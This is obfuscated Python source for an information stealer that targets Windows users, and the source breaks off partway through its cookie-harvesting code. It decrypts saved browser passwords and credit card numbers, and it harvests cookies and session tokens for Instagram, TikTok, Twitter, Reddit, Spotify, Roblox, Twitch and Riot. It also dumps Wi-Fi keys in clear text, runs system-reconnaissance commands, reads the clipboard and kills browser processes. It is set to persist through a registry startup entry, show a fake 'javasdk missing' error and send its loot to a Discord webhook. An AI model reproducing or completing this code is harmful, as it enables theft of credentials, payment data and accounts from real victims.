import ctypes #line:1
import platform #line:2
import json #line:3
import sys #line:4
import shutil #line:5
import sqlite3 #line:6
from cryptography .hazmat .primitives .ciphers import Cipher ,algorithms ,modes #line:7
from cryptography .hazmat .backends import default_backend #line:8
import re #line:9
import os #line:10
import asyncio #line:11
import aiohttp #line:12
import base64 #line:13
import time #line:14
import guardshield #line:15
import psutil #line:16
webhook ='https://discord.com/api/webhooks/bukismawebhookadresiniyaz'#line:18
startup_method ="regedit"#line:19
FakeError =(bool (True ),("Error","The Program can't start because javasdk is missing from your computer. Try reinstalling the program to fix this problem",0 ))#line:20
class Variables :#line:22
    Passwords =list ()#line:23
    Cards =list ()#line:24
    Cookies =list ()#line:25
    Historys =list ()#line:26
    Downloads =list ()#line:27
    Autofills =list ()#line:28
    Bookmarks =list ()#line:29
    Wifis =list ()#line:30
    SystemInfo =list ()#line:31
    ClipBoard =list ()#line:32
    Processes =list ()#line:33
    Network =list ()#line:34
    FullTokens =list ()#line:35
    ValidatedTokens =list ()#line:36
    DiscordAccounts =list ()#line:37
    SteamAccounts =list ()#line:38
    InstagramAccounts =list ()#line:39
    TwitterAccounts =list ()#line:40
    TikTokAccounts =list ()#line:41
    RedditAccounts =list ()#line:42
    TwtichAccounts =list ()#line:43
    SpotifyAccounts =list ()#line:44
    RobloxAccounts =list ()#line:45
    RiotGameAccounts =list ()#line:46
class SubModules :#line:48
    @staticmethod #line:49
    def CryptUnprotectData (O0O0O00OO00OOOO00 :bytes ,optional_entropy :str =None )->bytes :#line:50
        class O0OOOOOOO00OOO0OO (ctypes .Structure ):#line:52
            _fields_ =[("cbData",ctypes .c_ulong ),("pbData",ctypes .POINTER (ctypes .c_ubyte ))]#line:57
        OO0O0OOO00000OOO0 =O0OOOOOOO00OOO0OO (len (O0O0O00OO00OOOO00 ),ctypes .cast (O0O0O00OO00OOOO00 ,ctypes .POINTER (ctypes .c_ubyte )))#line:59
        O0OO0OO0O00000O00 =O0OOOOOOO00OOO0OO ()#line:60
        O00OO0OO0O0OO0O0O =None #line:61
        if optional_entropy is not None :#line:63
            optional_entropy =optional_entropy .encode ("utf-16")#line:64
            O00OO0OO0O0OO0O0O =O0OOOOOOO00OOO0OO (len (optional_entropy ),ctypes .cast (optional_entropy ,ctypes .POINTER (ctypes .c_ubyte )))#line:65
        if ctypes .windll .Crypt32 .CryptUnprotectData (ctypes .byref (OO0O0OOO00000OOO0 ),None ,ctypes .byref (O00OO0OO0O0OO0O0O )if O00OO0OO0O0OO0O0O is not None else None ,None ,None ,0 ,ctypes .byref (O0OO0OO0O00000O00 )):#line:67
            OOOO0OO00000O0O00 =(ctypes .c_ubyte *O0OO0OO0O00000O00 .cbData )()#line:68
            ctypes .memmove (OOOO0OO00000O0O00 ,O0OO0OO0O00000O00 .pbData ,O0OO0OO0O00000O00 .cbData )#line:69
            ctypes .windll .Kernel32 .LocalFree (O0OO0OO0O00000O00 .pbData )#line:70
            return bytes (OOOO0OO00000O0O00 )#line:71
        raise ValueError ("Invalid encrypted_data provided!")#line:73
    @staticmethod #line:75
    def GetKey (O0O00OOOOOO00O0O0 :str )->bytes :#line:76
        with open (O0O00OOOOOO00O0O0 ,"r",encoding ="utf-8",errors ="ignore")as OO0000000OO0O0OOO :#line:77
            O0OO00000000000O0 :dict =json .load (OO0000000OO0O0OOO )#line:78
            OOO000O0OOOOOOOOO :str =O0OO00000000000O0 ["os_crypt"]["encrypted_key"]#line:80
            OOO000O0OOOOOOOOO =base64 .b64decode (OOO000O0OOOOOOOOO .encode ())[5 :]#line:81
            return SubModules .CryptUnprotectData (OOO000O0OOOOOOOOO )#line:83
    @staticmethod #line:85
    def Decrpytion (OO00000O00OO0000O :bytes ,O0O0O00OO000000O0 :bytes )->str :#line:86
        try :#line:87
            O0OO0O00OOOO0OO00 =OO00000O00OO0000O .decode (errors ="ignore")#line:88
            if O0OO0O00OOOO0OO00 .startswith ("v10")or O0OO0O00OOOO0OO00 .startswith ("v11"):#line:89
                OOOOO0O0O0000OOOO =OO00000O00OO0000O [3 :15 ]#line:90
                OO00O0O0OOO00O000 =OO00000O00OO0000O [15 :]#line:91
                O00000000O0000000 =OO00O0O0OOO00O000 [-16 :]#line:92
                OO00O0O0OOO00O000 =OO00O0O0OOO00O000 [:-16 ]#line:93
                O0000OOOOOOOOO0OO =default_backend ()#line:94
                OOO0OO0O0000OOO0O =Cipher (algorithms .AES (O0O0O00OO000000O0 ),modes .GCM (OOOOO0O0O0000OOOO ,O00000000O0000000 ),backend =O0000OOOOOOOOO0OO )#line:95
                OO0OOO00O0OO0O000 =OOO0OO0O0000OOO0O .decryptor ()#line:96
                OOOOO0O0O00OO00OO =OO0OOO00O0OO0O000 .update (OO00O0O0OOO00O000 )+OO0OOO00O0OO0O000 .finalize ()#line:97
                return OOOOO0O0O00OO00OO .decode ('utf-8')#line:98
            else :#line:99
                return str (SubModules .CryptUnprotectData (OO00000O00OO0000O ))#line:100
        except :#line:101
            return "Decryption Error!, Data cant be decrypt"#line:102
    @staticmethod #line:104
    def create_mutex (OO0OO0O0OO0000OOO )->bool :#line:105
        OO0O0OOOO0O0O0OO0 =ctypes .windll .kernel32 #line:106
        O00O00OO000OOO000 =OO0O0OOOO0O0O0OO0 .CreateMutexA (None ,False ,OO0OO0O0OO0000OOO )#line:107
        return OO0O0OOOO0O0O0OO0 .GetLastError ()!=183 #line:108
    @staticmethod #line:110
    def IsAdmin ()->bool :#line:111
        try :#line:112
            return bool (ctypes .windll .shell32 .IsUserAnAdmin ())#line:113
        except :#line:114
            return False #line:115
class StealSystemInformation :#line:118
    async def FunctionRunner (OO0OO0O0OOO00000O )->None :#line:119
        try :#line:120
            OO0OO00O00O0000O0 =[asyncio .create_task (OO0OO0O0OOO00000O .StealSystemInformation ()),asyncio .create_task (OO0OO0O0OOO00000O .StealWifiInformation ()),asyncio .create_task (OO0OO0O0OOO00000O .StealProcessInformation ()),asyncio .create_task (OO0OO0O0OOO00000O .StealNetworkInformation ()),asyncio .create_task (OO0OO0O0OOO00000O .StealLastClipBoard ()),]#line:127
            await asyncio .gather (*OO0OO00O00O0000O0 )#line:129
        except Exception :#line:130
            pass #line:131
    async def GetDefaultSystemEncoding (OO0OO0O0OO00O0OO0 )->str :#line:133
        try :#line:134
            OOO0000OOO0OO00OO ="cmd.exe /c chcp"#line:135
            OOOO0O00OO00OO0OO =await asyncio .create_subprocess_shell (OOO0000OOO0OO00OO ,stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )#line:136
            OO00O0000O00000O0 ,O0OOOO0O0O00O0OOO =await OOOO0O00OO00OO0OO .communicate ()#line:137
            return OO00O0000O00000O0 .decode (errors ="ignore").split (":")[1 ].strip ()#line:138
        except :#line:139
            return "null"#line:140
    async def StealSystemInformation (OO00OO0000O000OOO )->None :#line:142
        try :#line:143
            O0OOOO0O000OOOOOO =await OO00OO0000O000OOO .GetDefaultSystemEncoding ()#line:144
            O0O00000OOO00000O =await asyncio .create_subprocess_shell (r'echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Online User#### & query user & echo ####Local Group#### & net localgroup & echo ####Administrators Info#### & net localgroup administrators & echo ####Guest User Info#### & net user guest & echo ####Administrator User Info#### & net user administrator & echo ####Startup Info#### & wmic startup get caption,command & echo ####Tasklist#### & tasklist /svc & echo ####Ipconfig#### & ipconfig/all & echo ####Hosts#### & type C:\WINDOWS\System32\drivers\etc\hosts & echo ####Route Table#### & route print & echo ####Arp Info#### & arp -a & echo ####Netstat#### & netstat -ano & echo ####Service Info#### & sc query type= service state= all & echo ####Firewallinfo#### & netsh firewall show state & netsh firewall show config',stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )#line:145
            OOO00O0000OO0OO0O ,O00OOOO00OO00O0O0 =await O0O00000OOO00000O .communicate ()#line:146
            Variables .SystemInfo .append (OOO00O0000OO0OO0O .decode (O0OOOO0O000OOOOOO ))#line:147
        except Exception :#line:148
            pass #line:149
    async def StealProcessInformation (O00OOOO00OOOOOO0O )->None :#line:151
        try :#line:152
            O0O0O00O00OOO000O =await asyncio .create_subprocess_shell ("tasklist /FO LIST",stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )#line:158
            OOO0OOOO0OO000O00 ,O0OOO0O00OO000OO0 =await O0O0O00O00OOO000O .communicate ()#line:159
            Variables .Processes .append (OOO0OOOO0OO000O00 .decode (errors ="ignore"))#line:160
        except Exception :#line:161
            pass #line:162
    async def StealLastClipBoard (O0000000OO00OO0O0 )->None :#line:164
        try :#line:165
            OO0000O00O0O0O000 =await asyncio .create_subprocess_shell ("powershell.exe Get-Clipboard",stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )#line:171
            OOO0O00OOO0OO0O0O ,OO00OOOOOO0O0OOOO =await OO0000O00O0O0O000 .communicate ()#line:172
            if OOO0O00OOO0OO0O0O :#line:173
                Variables .ClipBoard .append (OOO0O00OOO0OO0O0O .decode (errors ="ignore"))#line:174
        except Exception :#line:175
            pass #line:176
    async def StealNetworkInformation (O000000OOOO0O0OOO )->None :#line:178
        try :#line:179
            async with aiohttp .ClientSession ()as OO00O00O0O0O00000 :#line:180
                async with OO00O00O0O0O00000 .get ("http://ip-api.com/json")as O00OO0O000OOO0OO0 :#line:181
                    OO0OOO0OOOO0OOOO0 =await O00OO0O000OOO0OO0 .json ()#line:182
                    OO00OOO0OOO00OOO0 =OO0OOO0OOOO0OOOO0 ["query"]#line:183
                    OO000O0O00OOOOO00 =OO0OOO0OOOO0OOOO0 ["country"]#line:184
                    OO0OO0OO0OO000OOO =OO0OOO0OOOO0OOOO0 ["city"]#line:185
                    O00OOOOOOOO00O0OO =OO0OOO0OOOO0OOOO0 ["timezone"]#line:186
                    O0O00O00O00OO00OO =OO0OOO0OOOO0OOOO0 ["isp"]+f" {OO0OOO0OOOO0OOOO0['org']} {OO0OOO0OOOO0OOOO0['as']}"#line:187
                    Variables .Network .append ((OO00OOO0OOO00OOO0 ,OO000O0O00OOOOO00 ,OO0OO0OO0OO000OOO ,O00OOOOOOOO00O0OO ,O0O00O00O00OO00OO ))#line:188
        except Exception :#line:189
            pass #line:190
    async def StealWifiInformation (OOO0OOOOO0000O000 )->None :#line:192
        try :#line:193
            O0O0OOO0OO0OO0O00 =await OOO0OOOOO0000O000 .GetDefaultSystemEncoding ()#line:194
            OO0O00O0OOO00O0O0 =await asyncio .create_subprocess_shell ("netsh wlan show profiles",stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )#line:200
            OO0O000O0O0OO00OO ,O00OO000OO0O00000 =await OO0O00O0OOO00O0O0 .communicate ()#line:202
            OOO0OO00OOO0OO00O =None #line:203
            try :#line:205
                OOO0OO00OOO0OO00O =OO0O000O0O0OO00OO .decode (O0O0OOO0OO0OO0O00 )#line:206
            except :#line:207
                OOO0OO00OOO0OO00O =OO0O000O0O0OO00OO .decode (errors ="ignore")#line:208
            O00O000OO000OOOOO =re .findall (r'All User Profile\s*: (.*)',OOO0OO00OOO0OO00O )#line:210
            for O0000O0O0O0OO0OO0 in O00O000OO000OOOOO :#line:211
                OO0O0O0000O0OO000 =await asyncio .create_subprocess_shell (f'netsh wlan show profile name="{O0000O0O0O0OO0OO0}" key=clear',stdout =asyncio .subprocess .PIPE ,shell =True ,encoding =None )#line:217
                OO0O000O0O0OO00OO ,_O0O000O00OOO000OO =await OO0O0O0000O0OO000 .communicate ()#line:218
                try :#line:219
                    OO000OOOO0OO0O00O =OO0O000O0O0OO00OO .decode (O0O0OOO0OO0OO0O00 )#line:220
                except :OO000OOOO0OO0O00O =OO0O000O0O0OO00OO .decode (errors ="ignore")#line:221
                OOOO0O0OO0OOOO0O0 =re .search (r'Key content\s*: (.*)',OO000OOOO0OO0O00O ,re .IGNORECASE )#line:222
                Variables .Wifis .append ((O0000O0O0O0OO0OO0 ,OOOO0O0OO0OOOO0O0 .group (1 )if OOOO0O0OO0OOOO0O0 else "No password found"))#line:224
        except Exception :#line:225
            pass #line:226
class Main :#line:229
    def __init__ (O0000OO000OOOOO00 )->None :#line:230
        O0000OO000OOOOO00 .profiles_full_path =list ()#line:231
        O0000OO000OOOOO00 .RoamingAppData =os .getenv ('APPDATA')#line:232
        O0000OO000OOOOO00 .LocalAppData =os .getenv ('LOCALAPPDATA')#line:233
        O0000OO000OOOOO00 .Temp =os .getenv ('TEMP')#line:234
        O0000OO000OOOOO00 .FireFox =bool ()#line:235
        O0000OO000OOOOO00 .FirefoxFilesFullPath =list ()#line:236
        O0000OO000OOOOO00 .FirefoxCookieList =list ()#line:237
        O0000OO000OOOOO00 .FirefoxHistoryList =list ()#line:238
        O0000OO000OOOOO00 .FirefoxAutofiList =list ()#line:239
    async def FunctionRunner (O00OOOO0OO000OOO0 ):#line:240
        await O00OOOO0OO000OOO0 .kill_browsers ()#line:241
        O00OOOO0OO000OOO0 .list_profiles ()#line:242
        O00OOOO0OO000OOO0 .ListFirefoxProfiles ()#line:243
        O0O0OOO00000OO000 =[asyncio .create_task (O00OOOO0OO000OOO0 .GetPasswords ()),asyncio .create_task (O00OOOO0OO000OOO0 .GetCards ()),asyncio .create_task (O00OOOO0OO000OOO0 .GetCookies ()),asyncio .create_task (O00OOOO0OO000OOO0 .GetFirefoxCookies ()),asyncio .create_task (O00OOOO0OO000OOO0 .GetHistory ()),asyncio .create_task (O00OOOO0OO000OOO0 .GetFirefoxHistorys ()),asyncio .create_task (O00OOOO0OO000OOO0 .GetDownload ()),asyncio .create_task (O00OOOO0OO000OOO0 .GetBookMark ()),asyncio .create_task (O00OOOO0OO000OOO0 .GetAutoFill ()),asyncio .create_task (O00OOOO0OO000OOO0 .GetFirefoxAutoFills ()),asyncio .create_task (O00OOOO0OO000OOO0 .GetSteamSession ()),asyncio .create_task (O00OOOO0OO000OOO0 .GetTokens ()),StealSystemInformation ().FunctionRunner ()]#line:258
        await asyncio .gather (*O0O0OOO00000OO000 )#line:259
        await O00OOOO0OO000OOO0 .WriteToText ()#line:260
        await O00OOOO0OO000OOO0 .SendAllData ()#line:261
    def list_profiles (OOO00O00OOO0OO00O )->None :#line:262
        OO0O0OOO0OO0O0O00 ={'Google Chrome':os .path .join (OOO00O00OOO0OO00O .LocalAppData ,"Google","Chrome","User Data"),'Opera':os .path .join (OOO00O00OOO0OO00O .RoamingAppData ,"Opera Software","Opera Stable"),'Opera GX':os .path .join (OOO00O00OOO0OO00O .RoamingAppData ,"Opera Software","Opera GX Stable"),'Brave':os .path .join (OOO00O00OOO0OO00O .LocalAppData ,"BraveSoftware","Brave-Browser","User Data"),'Edge':os .path .join (OOO00O00OOO0OO00O .LocalAppData ,"Microsoft","Edge","User Data"),}#line:269
        for OOO0O0000OOOO0O0O ,OOOO000OOOOOO00O0 in OO0O0OOO0OO0O0O00 .items ():#line:270
            if os .path .isdir (OOOO000OOOOOO00O0 ):#line:271
                if "Opera"in OOOO000OOOOOO00O0 :#line:272
                    OOO00O00OOO0OO00O .profiles_full_path .append (OOOO000OOOOOO00O0 )#line:273
                else :#line:274
                    for OOO00OOOOOOOO0OOO ,O00O000OOOO000O00 ,OOOO00OOOO0OO0O00 in os .walk (OOOO000OOOOOO00O0 ):#line:275
                        for OOO0000OOOOOOO000 in O00O000OOOO000O00 :#line:276
                            OOO000O00O0OO0O00 =os .path .join (OOO00OOOOOOOO0OOO ,OOO0000OOOOOOO000 )#line:277
                            if OOO0000OOOOOOO000 =='Default'or OOO0000OOOOOOO000 .startswith ('Profile')or "Guest Profile"in OOO0000OOOOOOO000 :#line:278
                                OOO00O00OOO0OO00O .profiles_full_path .append (OOO000O00O0OO0O00 )#line:279
    def ListFirefoxProfiles (O00OO00O000000O0O )->None :#line:280
        try :#line:281
            OOOO00OOO000000O0 =os .path .join (O00OO00O000000O0O .RoamingAppData ,"Mozilla","Firefox","Profiles")#line:282
            if os .path .isdir (OOOO00OOO000000O0 ):#line:283
                for O0000OO0OOOO00O00 ,O0O0OOO0000O00O0O ,OO0OO0000OOO000OO in os .walk (OOOO00OOO000000O0 ):#line:284
                    for O0O0O0OOOOOO0000O in OO0OO0000OOO000OO :#line:285
                        O00OO0OOO0O00OOOO =os .path .join (O0000OO0OOOO00O00 ,O0O0O0OOOOOO0000O )#line:286
                        if O0O0O0OOOOOO0000O .endswith ("cookies.sqlite")or O0O0O0OOOOOO0000O .endswith ("places.sqlite")or O0O0O0OOOOOO0000O .endswith ("formhistory.sqlite"):#line:287
                            O00OO00O000000O0O .FirefoxFilesFullPath .append (O00OO0OOO0O00OOOO )#line:288
        except :#line:289
            pass #line:290
    async def kill_browsers (OOO0OO00000O00OO0 ):#line:291
        OO0O0OOOO0000OOO0 =["chrome.exe","opera.exe","edge.exe","firefox.exe","brave.exe"]#line:292
        O000OOOO0O00O0000 =await asyncio .create_subprocess_shell ('tasklist',stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE )#line:297
        O0OO0O00OO00OO0O0 ,OO000OO0OOO00OOO0 =await O000OOOO0O00O0000 .communicate ()#line:299
        if not O000OOOO0O00O0000 .returncode !=0 :#line:300
            OO0O0OOO0O0OOOO0O =O0OO0O00OO00OO0O0 .decode (errors ="ignore").split ('\n')#line:301
            for O0O0O0O0OOOOO0000 in OO0O0OOO0O0OOOO0O :#line:302
                for O0OOOO0OOOO00OOO0 in OO0O0OOOO0000OOO0 :#line:303
                    if O0OOOO0OOOO00OOO0 .lower ()in O0O0O0O0OOOOO0000 .lower ():#line:304
                        O000OO0OOOOOOOO00 =O0O0O0O0OOOOO0000 .split ()#line:305
                        O0O00OO0O0OO0OOO0 =O000OO0OOOOOOOO00 [1 ]#line:306
                        O000OOOO0O00O0000 =await asyncio .create_subprocess_shell (f'taskkill /F /PID {O0O00OO0O0OO0OOO0}',stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE )#line:311
                        await O000OOOO0O00O0000 .communicate ()#line:312
    async def GetFirefoxCookies (O0OO0OOO0OOOOOOO0 )->None :#line:313
        try :#line:314
            for O0O00O00OOO00OOOO in O0OO0OOO0OOOOOOO0 .FirefoxFilesFullPath :#line:315
                if "cookie"in O0O00O00OOO00OOOO :#line:316
                    OOO0O0OO0OOO000O0 =sqlite3 .connect (O0O00O00OOO00OOOO )#line:317
                    OO0O00OO00O000000 =OOO0O0OO0OOO000O0 .cursor ()#line:318
                    OO0O00OO00O000000 .execute ('SELECT host, name, path, value, expiry FROM moz_cookies')#line:319
                    OOOO0O0OOO0O000O0 =None #line:320
                    OOOOO00OOOO00OOO0 =None #line:321
                    OO0000O0OOOOO0000 =OO0O00OO00O000000 .fetchall ()#line:322
                    for OOOOOOO000OO000OO in OO0000O0OOOOO0000 :#line:323
                        O0OO0OOO0OOOOOOO0 .FirefoxCookieList .append (f"{OOOOOOO000OO000OO[0]}\t{'FALSE' if OOOOOOO000OO000OO[4] == 0 else 'TRUE'}\t{OOOOOOO000OO000OO[2]}\t{'FALSE' if OOOOOOO000OO000OO[0].startswith('.') else 'TRUE'}\t{OOOOOOO000OO000OO[4]}\t{OOOOOOO000OO000OO[1]}\t{OOOOOOO000OO000OO[3]}\n")#line:324
                        if "instagram"in str (OOOOOOO000OO000OO [0 ]).lower ()and "sessionid"in str (OOOOOOO000OO000OO [1 ]).lower ():#line:325
                            asyncio .create_task (O0OO0OOO0OOOOOOO0 .InstaSession (OOOOOOO000OO000OO [3 ],"Firefox"))#line:326
                        if "tiktok"in str (OOOOOOO000OO000OO [0 ]).lower ()and str (OOOOOOO000OO000OO [1 ])=="sessionid":#line:327
                            asyncio .create_task (O0OO0OOO0OOOOOOO0 .TikTokSession (OOOOOOO000OO000OO [3 ],"Firefox"))#line:328
                        if "twitter"in str (OOOOOOO000OO000OO [0 ]).lower ()and str (OOOOOOO000OO000OO [1 ])=="auth_token":#line:329
                            asyncio .create_task (O0OO0OOO0OOOOOOO0 .TwitterSession (OOOOOOO000OO000OO [3 ],"Firefox"))#line:330
                        if "reddit"in str (OOOOOOO000OO000OO [0 ]).lower ()and "reddit_session"in str (OOOOOOO000OO000OO [1 ]).lower ():#line:331
                            asyncio .create_task (O0OO0OOO0OOOOOOO0 .RedditSession (OOOOOOO000OO000OO [3 ],"Firefox"))#line:332
                        if "spotify"in str (OOOOOOO000OO000OO [0 ]).lower ()and "sp_dc"in str (OOOOOOO000OO000OO [1 ]).lower ():#line:333
                            asyncio .create_task (O0OO0OOO0OOOOOOO0 .SpotifySession (OOOOOOO000OO000OO [3 ],"Firefox"))#line:334
                        if "roblox"in str (OOOOOOO000OO000OO [0 ]).lower ()and "ROBLOSECURITY"in str (OOOOOOO000OO000OO [1 ]):#line:335
                            asyncio .create_task (O0OO0OOO0OOOOOOO0 .RobloxSession (OOOOOOO000OO000OO [3 ],"Firefox"))#line:336
                        if "twitch"in str (OOOOOOO000OO000OO [0 ]).lower ()and "auth-token"in str (OOOOOOO000OO000OO [1 ]).lower ():#line:337
                            OOOOO00OOOO00OOO0 =OOOOOOO000OO000OO [3 ]#line:338
                        if "twitch"in str (OOOOOOO000OO000OO [0 ]).lower ()and str (OOOOOOO000OO000OO [1 ]).lower ()=="login":#line:339
                            OOOO0O0OOO0O000O0 =OOOOOOO000OO000OO [3 ]#line:340
                        if not OOOO0O0OOO0O000O0 ==None and not OOOOO00OOOO00OOO0 ==None :#line:341
                            asyncio .create_task (O0OO0OOO0OOOOOOO0 .TwitchSession (OOOOO00OOOO00OOO0 ,OOOO0O0OOO0O000O0 ,"Firefox"))#line:342
                            OOOO0O0OOO0O000O0 =None #line:343
                            OOOOO00OOOO00OOO0 =None #line:344
                        if "account.riotgames.com"in str (OOOOOOO000OO000OO [0 ]).lower ()and "sid"in str (OOOOOOO000OO000OO [1 ]).lower ():#line:345
                            asyncio .create_task (O0OO0OOO0OOOOOOO0 .RiotGamesSession (OOOOOOO000OO000OO [3 ],"Firefox"))#line:346
        except :#line:347
            pass #line:348
        else :#line:349
            O0OO0OOO0OOOOOOO0 .FireFox =True #line:350
    async def GetFirefoxHistorys (O0OOO0O0O0O00O0O0 )->None :#line:351
        try :#line:352
            for OO000000O0O00OOOO in O0OOO0O0O0O00O0O0 .FirefoxFilesFullPath :#line:353
                if "places"in OO000000O0O00OOOO :#line:354
                    O00O0O0OO000O00OO =sqlite3 .connect (OO000000O0O00OOOO )#line:355
                    OO00O0O0O000O00OO =O00O0O0OO000O00OO .cursor ()#line:356
                    OO00O0O0O000O00OO .execute ('SELECT id, url, title, visit_count, last_visit_date FROM moz_places')#line:357
                    OO0OO00OO0000OO00 =OO00O0O0O000O00OO .fetchall ()#line:358
                    for O00OOOOO0OOOOOO0O in OO0OO00OO0000OO00 :#line:359
                        O0OOO0O0O0O00O0O0 .FirefoxHistoryList .append (f"ID: {O00OOOOO0OOOOOO0O[0]}\nRL: {O00OOOOO0OOOOOO0O[1]}\nTitle: {O00OOOOO0OOOOOO0O[2]}\nVisit Count: {O00OOOOO0OOOOOO0O[3]}\nLast Visit Time: {O00OOOOO0OOOOOO0O[4]}\n====================================================================================\n")#line:360
        except :#line:361
            pass #line:362
        else :#line:363
            O0OOO0O0O0O00O0O0 .FireFox =True #line:364
    async def GetFirefoxAutoFills (O0OO000000OO00O00 )->None :#line:365
        try :#line:366
            for OO00000OOOOO0O0O0 in O0OO000000OO00O00 .FirefoxFilesFullPath :#line:367
                if "formhistory"in OO00000OOOOO0O0O0 :#line:368
                    O0O0O00OOOOO0OOOO =sqlite3 .connect (OO00000OOOOO0O0O0 )#line:369
                    O00000000OOO000O0 =O0O0O00OOOOO0OOOO .cursor ()#line:370
                    O00000000OOO000O0 .execute ("select * from moz_formhistory")#line:371
                    OO00O0000000OOOO0 =O00000000OOO000O0 .fetchall ()#line:372
                    for OOOOO0000O0OO0O00 in OO00O0000000OOOO0 :#line:373
                        O0OO000000OO00O00 .FirefoxAutofiList .append (f"{OOOOO0000O0OO0O00}\n")#line:374
        except :#line:375
            pass #line:376
        else :#line:377
            O0OO000000OO00O00 .FireFox =True #line:378
    async def GetPasswords (O000000O0OOO0O0OO )->None :#line:379
        try :#line:380
            for OOOOO0O0O0O0O00O0 in O000000O0OOO0O0OO .profiles_full_path :#line:381
                OOO0OOOOO0O0O0OOO ="None"#line:382
                O0OO000O00O000O00 =OOOOO0O0O0O0O00O0 .find ("User Data")#line:383
                if O0OO000O00O000O00 !=-1 :#line:384
                    OO0000000O00OOO00 =OOOOO0O0O0O0O00O0 [:O0OO000O00O000O00 +len ("User Data")]#line:385
                if "Opera"in OOOOO0O0O0O0O00O0 :#line:386
                    OO0000000O00OOO00 =OOOOO0O0O0O0O00O0 #line:387
                    OOO0OOOOO0O0O0OOO ="Opera"#line:388
                else :#line:389
                    OO0O000O0O0OOO0O0 =OOOOO0O0O0O0O00O0 .split ("\\")#line:390
                    OOO0OOOOO0O0O0OOO =OO0O000O0O0OOO0O0 [-4 ]+" "+OO0O000O0O0OOO0O0 [-3 ]#line:391
                O0O0O0O00OO000OOO =SubModules .GetKey (os .path .join (OO0000000O00OOO00 ,"Local State"))#line:392
                OO0OOOO0O000O0OO0 =os .path .join (OOOOO0O0O0O0O00O0 ,"Login Data")#line:393
                OO0O0OO0O0O00OOO0 =os .path .join (O000000O0OOO0O0OO .Temp ,"Logins.db")#line:394
                shutil .copyfile (OO0OOOO0O000O0OO0 ,OO0O0OO0O0O00OOO0 )#line:395
                O00O00OOOOO0O0O0O =sqlite3 .connect (OO0O0OO0O0O00OOO0 )#line:396
                O000OO000O0O00O0O =O00O00OOOOO0O0O0O .cursor ()#line:397
                O000OO000O0O00O0O .execute ('select origin_url, username_value, password_value from logins')#line:398
                OO00OO0O00OOOOO00 =O000OO000O0O00O0O .fetchall ()#line:399
                try :#line:400
                    O000OO000O0O00O0O .close ()#line:401
                    O00O00OOOOO0O0O0O .close ()#line:402
                    os .remove (OO0O0OO0O0O00OOO0 )#line:403
                except :pass #line:404
                for OOOOO0O00O00O0000 in OO00OO0O00OOOOO00 :#line:405
                    if OOOOO0O00O00O0000 [0 ]and OOOOO0O00O00O0000 [1 ]and OOOOO0O00O00O0000 [2 ]:#line:406
                        Variables .Passwords .append (f"URL : {OOOOO0O00O00O0000[0]}\nUsername : {OOOOO0O00O00O0000[1]}\nPassword : {SubModules.Decrpytion(OOOOO0O00O00O0000[2], O0O0O0O00OO000OOO)}\nBrowser : {OOO0OOOOO0O0O0OOO}\n======================================================================\n")#line:407
        except :#line:408
            pass #line:409
    async def GetCards (OO0OOO0O0O0O00O00 )->None :#line:410
        try :#line:411
            for O00OO0O0O0O0O0OO0 in OO0OOO0O0O0O00O00 .profiles_full_path :#line:412
                OO00OOOO000000O00 =O00OO0O0O0O0O0OO0 .find ("User Data")#line:413
                if OO00OOOO000000O00 !=-1 :#line:414
                    O0OO00O000OO0OO00 =O00OO0O0O0O0O0OO0 [:OO00OOOO000000O00 +len ("User Data")]#line:415
                if "Opera"in O00OO0O0O0O0O0OO0 :#line:416
                    O0OO00O000OO0OO00 =O00OO0O0O0O0O0OO0 #line:417
                O00OO0OO0O00O000O =SubModules .GetKey (os .path .join (O0OO00O000OO0OO00 ,"Local State"))#line:418
                OO0OOOOO0O0O00000 =os .path .join (O00OO0O0O0O0O0OO0 ,"Web Data")#line:419
                O000O0O0O0000OOOO =os .path .join (OO0OOO0O0O0O00O00 .Temp ,"Web.db")#line:420
                shutil .copyfile (OO0OOOOO0O0O00000 ,O000O0O0O0000OOOO )#line:421
                OOO0O0O0OO0OOOOOO =sqlite3 .connect (O000O0O0O0000OOOO )#line:422
                O0OO00OOOOO00OOO0 =OOO0O0O0OO0OOOOOO .cursor ()#line:423
                O0OO00OOOOO00OOO0 .execute ('select card_number_encrypted, expiration_year, expiration_month, name_on_card from credit_cards')#line:424
                O0000OO0O0O0OOO00 =O0OO00OOOOO00OOO0 .fetchall ()#line:425
                try :#line:426
                    O0OO00OOOOO00OOO0 .close ()#line:427
                    OOO0O0O0OO0OOOOOO .close ()#line:428
                    os .remove (O000O0O0O0000OOOO )#line:429
                except :pass #line:430
                for OO00000000O000000 in O0000OO0O0O0OOO00 :#line:431
                    if OO00000000O000000 [2 ]<10 :#line:432
                        OOO00000OO00OOO0O ="0"+str (OO00000000O000000 [2 ])#line:433
                    else :OOO00000OO00OOO0O =OO00000000O000000 [2 ]#line:434
                    Variables .Cards .append (f"{SubModules.Decrpytion(OO00000000O000000[0], O00OO0OO0O00O000O)}\t{OOO00000OO00OOO0O}/{OO00000000O000000[1]}\t{OO00000000O000000[3]}\n")#line:435
        except :#line:436
            pass #line:437
    async def GetCookies (O0OO0O0O00OOO0O0O )->None :#line:438
        try :#line:439
            for O00O000O0O0O00OO0 in O0OO0O0O00OOO0O0O .profiles_full_path :#line:440
                OOO00OOOO00O0O0OO ="None"#line:441
                OO0O0O0O00OO000O0 =O00O000O0O0O00OO0 .find ("User Data")#line:442
                if OO0O0O0O00OO000O0 !=-1 :#line:443
                    O0OOO00OOO00O00O0 =O00O000O0O0O00OO0 [:OO0O0O0O00OO000O0 +len ("User Data")]#line:444
                if "Opera"in O00O000O0O0O00OO0 :#line:445
                    O0OOO00OOO00O00O0 =O00O000O0O0O00OO0 #line:446
                    OOO00OOOO00O0O0OO ="Opera"#line:447
                else :#line:448
                    O0OOOO0O0000O0000 =O00O000O0O0O00OO0 .split ("\\")#line:449
                    OOO00OOOO00O0O0OO =O0OOOO0O0000O0000 [-4 ]+" "+O0OOOO0O0000O0000 [-3 ]#line:450
